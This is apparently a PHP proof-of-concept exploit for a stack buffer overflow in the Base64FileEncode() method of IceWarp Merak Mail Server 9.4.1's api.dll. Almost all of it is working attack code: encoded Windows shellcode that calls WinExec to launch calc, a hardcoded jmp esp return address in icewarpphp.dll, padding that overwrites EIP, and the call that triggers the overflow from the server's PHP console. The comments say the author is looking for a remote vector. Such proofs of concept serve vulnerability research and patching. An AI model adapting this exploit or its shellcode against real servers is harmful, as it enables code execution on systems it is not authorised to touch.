<?php
/* Icewarp Merak Mail Server 9.4.1 IceWarpServer.APIObject/api.dll
   Base64FileEncode() stack based buffer overflow poc
   by Nine:Situations:Group::surfista
   site: http://retrogod.altervista.org/

   api.dll contains a stack based buffer overflow in the second argument of
   Base64FileEncode() method, this shared library can be loaded ex. by the
   IceWarp PHP extension which is carried by the Webmail service. You have
   interesting results if the final argument of the icewarp_apiobjectcall()
   function is exposed to remote user input, which is possible by design, with
   the vulnerable method specified.
   We are searching a remote vector for this!

*/

if (php_sapi_name() <> "cgi-fcgi") {
        die("Launch from the merak php console!");
    }

if (!function_exists("icewarp_apiobjectcall")) {
        die("You need the icewarp extension loaded!");
   }

$shellcode= //original scode, alpha2 esp <sh.txt
"\xeb\x13\x5b\x31\xc0\x50\x31\xc0\x88\x43\x4a\x53".
"\xbb\x0d\x25\x86\x7c". //WinExec, kernel32.dll XP SP3
"\xff\xd3\x31\xc0\xe8\xe8\xff\xff\xff".
"cmd /c start calc && ".
"\xff";

$shellcode="TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP".
           "8ABuJIJK5CCktqO0rpP1kpOxcsczF3OKdMUumVQlkON3P1".
           "YPkXhhyokOyo1sPmST10FOqs7PSCrT1q3BrT5pRCaqPlRC".
           "wPQ6EvgPKOksA";

$eip="\x2c\x47\x4b\x01"; //jmp esp - icewarpphp.dll

$bof=str_repeat("A",0x258).
    "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN".
    $eip.
    $shellcode;

$_x = icewarp_apiobjectcall(0, '', 'IceWarpServer.APIObject');

$source="AAAA";
$destination=$bof;

icewarp_apiobjectcall( $_x, "Base64FileEncode", $source , $destination );

?>
